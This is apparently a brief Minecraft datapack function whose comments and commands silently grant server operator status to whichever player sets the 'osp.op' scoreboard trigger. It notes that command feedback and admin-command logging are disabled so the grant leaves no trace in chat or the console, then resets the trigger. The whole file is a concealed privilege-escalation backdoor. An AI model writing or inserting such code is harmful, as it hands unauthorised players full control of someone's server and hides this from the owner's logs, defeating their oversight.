# Silently grant OP to the requesting player
# gamerule sendCommandFeedback=false and logAdminCommands=false
# prevent any output to chat or server console

op @s

# Reset trigger immediately
scoreboard players set @s osp.op 0
